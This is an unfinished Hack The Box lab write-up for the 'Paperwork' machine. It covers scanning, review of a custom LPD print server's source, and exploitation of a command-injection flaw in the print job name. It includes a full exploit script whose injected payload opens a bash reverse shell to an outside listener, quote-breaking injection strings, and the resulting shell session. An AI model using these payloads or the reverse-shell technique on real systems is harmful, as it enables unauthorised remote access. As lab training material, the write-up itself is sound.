---
title: "Paperwork"
kind: writeup
tags:
  - hack-the-box-labs
  - status/in-progress
  - writeup
  - linux
  - web
status: "In progress"
difficulty: "Easy"
date: 2026-07-12
database: "Hack The Box"
area: "Hack The Box Labs"
up: "[[Hack The Box]]"
notion-id: 39b759b9275180e9a95bd4f863002cc9
---

# Paperwork

In: [[Career]] / [[Hack The Box Labs]] / [[Hack The Box]]

## Nmap Scan

```bash
┌──(exp10i73r㉿kali)-[~]
└─$ nmap -p- --min-rate 1000 -T4 -Pn -sV -oA nmap/paperwork 10.129.83.151
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 18:08 +0530
Warning: 10.129.83.151 giving up on port because retransmission cap hit (6).
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.00% done; ETC: 18:10 (0:01:17 remaining)
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:12 (0:00:00 remaining)
Nmap scan report for 10.129.83.151
Host is up (5.5s latency).
Not shown: 60045 closed tcp ports (reset), 5487 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=7%D=7/12%Time=6A538BFB%P=aarch64-unknown-linux-gn
SF:u%r(TerminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20an
SF:d\x20printing\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 315.05 seconds

```

## Recon

#### Fuzzed Subdomains, but didn’t got anything

```python
┌──(exp10i73r㉿kali)-[~]
└─$ ffuf -u "http://paperwork.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://paperwork.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [20481/20481] :: Job [1/1] :: 62 req/sec :: Duration: [0:04:04] :: Errors: 0 ::
                                                                                                                              
```

![[attachments/Hack The Box Labs/Hack The Box/Paperwork/Screenshot_2026-07-12_at_18-15-54.png]]

After downloading and extracting the archive zip, it contained [server.py](http://server.py) file

```python
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()

```

## Reviewing Server python file

Port 1515 — custom LPD-style service

Source ([server.py](http://server.py/)) reviewed. It's a hand-rolled RFC 1179 receiver. Two issues identified:

Bug 1 — queue validation logic flaw

pythonif queue not in VALID_QUEUE:

VALID_QUEUE is a plain string from an env var, so this is a substring check, not membership check — sending the known queue name archive_intake should pass validation.

Bug 2 — command injection (the real vuln)

pythonsubprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

job_name is taken unsanitized from a J-prefixed line in attacker-controlled submitted content, then interpolated into a shell=True command string. Closing the quote and chaining a command yields arbitrary command execution as the service's user, e.g.:

J'; id > /tmp/pwned; echo '

Protocol shape (reverse-engineered from source):

Connect → send \x02 + archive_intake (command byte 2 = "receive print job" + queue name)
Loop: send a chunk where chunk[0] is a subcommand byte and chunk[1:] is "<size> <rest>"; server reads size bytes as file content
A line starting with J inside that content becomes job_name — the injection point
Server acks with \x00 a few times, then drains further input

## Exploitation

#### Create a exploit.py

```python
#!/usr/bin/env python3
import socket
import sys
import time

TARGET = "10.129.83.151"
PORT = 1515
QUEUE = "archive_intake"

# Command injection payload in the job name (closes the quote, chains a command)
INJECT_CMD = "bash -c 'bash -i >& /dev/tcp/10.10.16.78/4444 0>&1'"  # change to your actual command/reverse-shell one-liner
JOB_NAME = f"'; {INJECT_CMD} > /tmp/poc_out.txt; echo '"

def recvn(sock, n, timeout=3):
    sock.settimeout(timeout)
    data = b""
    try:
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))

    # Step 1: command=2 (receive print job) + queue name
    s.send(bytes([2]) + QUEUE.encode())
    resp = recvn(s, 1)
    print(f"[*] Queue accept response: {resp!r}  (\\x01 = rejected)")
    if resp == b"\x01":
        print("[-] Queue rejected, check the queue name")
        return

    # Step 2: build file content -- job name line must start with 'J'
    content = f"H some_host\nJ{JOB_NAME}\nP someuser\n".encode()
    size = len(content)

    # subcommand byte (value likely doesn't matter much per the code you found,
    # it just reads chunk[0] then parses "<size> <rest>" from chunk[1:])
    header = bytes([0x02]) + f" {size} dfA001host".encode()
    s.send(header)
    print("[*] Ack after header:", recvn(s, 1))

    # Step 3: send the actual content
    s.send(content)
    print("[*] Ack after content (x2 expected):", recvn(s, 2))

    time.sleep(1)
    s.close()
    print("[*] Done -- check /tmp/poc_out.txt on the box via another vector, or chain this into a reverse shell payload directly.")

if __name__ == "__main__":
    main()
```

```python
┌──(exp10i73r㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.78] from (UNKNOWN) [10.129.83.151] 39908
bash: cannot set terminal process group (979): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$ ls
ls
server.py
lp@paperwork:/opt/LPDServer$ cd /home   
cd /home
lp@paperwork:/home$ ls
ls
archivist
lp@paperwork:/home$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
lp@paperwork:/home$ ^Z
zsh: suspended  nc -nlvp 4444
                                                                                                                                                                     
┌──(exp10i73r㉿kali)-[~]
└─$ stty raw -echo; fg         
[1]  + continued  nc -nlvp 4444

lp@paperwork:/home$ cd archivist/
bash: cd: archivist/: Permission denied
lp@paperwork:/home$ l
l: command not found
lp@paperwork:/home$ cd /opt

```

## User Flag

```python

```

[[Post-Shell Enumeration & JetDirect Privesc]]
